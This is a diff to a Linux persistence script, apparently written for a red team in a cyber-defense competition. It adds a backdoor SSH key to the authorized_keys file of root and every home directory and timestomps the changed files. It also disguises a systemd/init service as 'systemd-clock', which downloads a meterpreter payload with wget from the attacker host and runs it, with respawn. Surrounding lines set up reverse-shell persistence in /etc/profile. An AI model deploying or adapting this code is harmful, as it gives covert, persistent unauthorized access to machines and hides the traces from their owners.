@@ -176,6 +176,9 @@ REVERSE_PORT="59002"
 BIND_PORT="60000"
 FIFO_REVERSE="/tmp/systemd-private-68eb5cd948c04958a3aa64dc96efabaa-colord.service-73xi5h"
 FIFO_BIND="systemd-private-68eb5cd948c03875a3aa64dc96efabaa-upower.service-O6ME4M"
+
+SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDECrcus+R9kJjhjzm4iSvjTvqRUmpJCg1cxi4U1TrPnaUhz+k5utWzrJlJjm/Cn6lmTO75jcYCQwWGKatf2WwZtN5hkMb++d6DHb1KXOGrNdkEbgvA8DBMDkWbR9NUyLzF2enfSwdJqDRNVPWhTGyqUIPaHH5HCEAPmDxQnnojOFhRg5t+ZaxJtQ0GvGBKxIAcl+wn4OyiW7/EpT2dHsZactSZb+az2bWcP01W6UUYq8ttZADFI1+g31UEPd9tGJbkCbCg0jPsb9fGPN0QkIdRf9LMWqMBkLOscyT5VOyawZjsupFjYOiSswfcEvI3hmSc13crFQzR45wXn4IhjCgZ blackteam@wrccdc.org"
+
 GLOBAL_PROFILE="/etc/profile"
 GLOBAL_PROFILE_DIR="/etc/profile.d"
 PROFILE_FILE="bash_completion.sh"
@@ -189,19 +192,20 @@ CRONTAB_REPLACE_NORMAL=$(sed 's/\\//g' <<< "$CRONTAB_REPLACE")
 CRONTAB_SOMETHING="\*[[:blank:]]\+root[[:blank:]]\+"
 
 # Web delivery meterpreter
-WEB_URI="gnano"
+WEB_URI="systemd-clock"
 WEB_PORT="8080"
 
 # Services
 SERVICE_PAYLOAD_PATH="/bin/$WEB_URI"
-SERVICE_NAME="system-pkg"
+SERVICE_NAME="systemd-clock"
+SERVICE_DESCRIPTION="Clock Service Daemon"
 #SERVICE_COMMAND="/usr/bin/test -f $SERVICE_PAYLOAD_PATH || $(which wget) -qO $SERVICE_PAYLOAD_PATH --no-check-certificate http://$IP:$WEB_PORT/$WEB_URI; $(which chmod) +x $SERVICE_PAYLOAD_PATH; $SERVICE_PAYLOAD_PATH; exit 0"
 SERVICE_COMMAND="$(which wget) -qO $SERVICE_PAYLOAD_PATH --no-check-certificate http://$IP:$WEB_PORT/$WEB_URI && $(which chmod) +x $SERVICE_PAYLOAD_PATH && $SERVICE_PAYLOAD_PATH && exit 0"
 
 # systemd
 SYSTEMD_SERVICE_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
 SYSTEMD_SERVICE="[Unit]
-Description=Binary Repository Package Manager
+Description=$SERVICE_DESCRIPTION
 
 [Service]
 Type=simple
@@ -214,10 +218,12 @@ WantedBy=multi-user.target"
 
 # SysVInit
 INIT_SERVICE_PATH="/etc/init/${SERVICE_NAME}.conf"
-INIT_PID_PATH="/var/run/brpm.pid"
-INIT_SERVICE="description \"binary repository package manager\"
+INIT_PID_PATH="/var/run/csd.pid"
+INIT_SERVICE="description \"$SERVICE_DESCRIPTION\"
 start on filesystem or runlevel 2345
 stop on shutdown
+respawn
+respawn limit 10 5
 script
     echo \$\$ > $INIT_PID_PATH
     $SERVICE_COMMAND
@@ -226,6 +232,52 @@ end script"
 
 
 # *** Main ***
+
+cecho task "Adding SSH key to all users' authorized_keys files"
+
+# Don't forget to include /root/.ssh/authorized_keys
+for home_dir in /root /home/*; do
+
+	# Ensure we're working on a directory, not a random file in /home/
+	if [ -d "$home_dir"]; then
+
+		home_timestamp=$(get_timestamp "$home_dir")
+
+		# Create user's ~/.ssh directory if necessary, and retrieve appropriate timestamps
+		if [ -d "$home_dir/.ssh" ]; then
+			ssh_timestamp=$(get_timestamp "$home_dir/.ssh")
+			cecho log "'$home_dir/.ssh' already exists"
+		else
+			ssh_timestamp=$(get_timestamp "$home_dir")
+			cecho info "Creating '$home_dir/.ssh'"
+			mkdir -p "$home_dir/.ssh"
+		fi
+
+		# Retrieve appropriate timestamps for authorized_keys files
+		if [ -f "$home_dir/.ssh/authorized_keys" ]; then
+			keys_timestamp=$(get_timestamp "$home_dir/.ssh/authorized_keys")
+			cecho log "'$home_dir/.ssh/authorized_keys' already exists"
+		else
+			keys_timestamp=$ssh_timestamp
+			cecho info "Will create '$home_dir/.ssh/authorized_keys'"
+		fi
+
+		# Add the key
+		echo "$SSH_KEY" >> "$home_dir/.ssh/authorized_keys" && cecho info "Added key to '$home_dir/.ssh/authorized_keys'" || cecho error "Could not write to '$home_dir/.ssh/authorized_keys'"
+
+		# Timestomp
+		set_timestamp $home_timestamp "$home_dir"
+		set_timestamp $ssh_timestamp "$home_dir/.ssh"
+		set_timestamp $keys_timestamp "$home_dir/.ssh/authorized_keys"
+
+	else
+		cecho warning "Skipping non-directory '$home_dir'"
+	fi
+
+done
+
+cecho done "Done adding SSH key to authorized_keys files"
+
 
 cecho task "Persisting reverse shells in '$GLOBAL_PROFILE'"
 
